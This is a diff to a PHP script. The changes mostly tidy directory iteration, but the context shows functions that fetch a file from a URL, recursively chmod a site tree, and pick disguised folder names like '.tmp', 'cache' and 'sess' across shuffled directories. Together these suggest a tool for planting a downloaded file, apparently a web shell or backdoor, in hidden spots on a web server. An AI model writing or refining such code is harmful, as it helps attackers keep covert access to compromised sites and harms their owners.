@@ -2,6 +2,7 @@
 ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
+
 $success = [];
 $error = [];
 
@@ -19,7 +20,9 @@ function fetchFileFromUrl($url) {
 }
 
 function setPermissions($dir, &$success, &$error) {
-    $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
+    $rii = new RecursiveIteratorIterator(
+        new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS)
+    );
     foreach ($rii as $file) {
         if ($file->isDir()) {
             if (@chmod($file->getPathname(), 0755)) {
@@ -40,15 +43,12 @@ function setPermissions($dir, &$success, &$error) {
 function generateRandomFolderName($base, $used = []) {
     $names = ['.tmp', 'cache', 'function', 'logs', 'sess', 'lib', 'assets', 'data'];
     shuffle($names);
-
     foreach ($names as $name) {
         $folder = $base . '/' . $name;
         if (!in_array($folder, $used) && !is_dir($folder)) {
             return $folder;
         }
     }
-
-    // fallback jika semua sudah dipakai
     return $base . '/folder_' . substr(md5(uniqid()), 0, 6);
 }
 
@@ -73,9 +73,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             setPermissions($target, $success, $error);
 
             $all = [];
-            $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target));
+            $rii = new RecursiveIteratorIterator(
+                new RecursiveDirectoryIterator($target, FilesystemIterator::SKIP_DOTS)
+            );
             foreach ($rii as $file) {
-                if ($file->isDir() && !$file->isDot()) $all[] = $file->getPathname();
+                if ($file->isDir()) {
+                    $all[] = $file->getPathname();
+                }
             }
 
             shuffle($all);
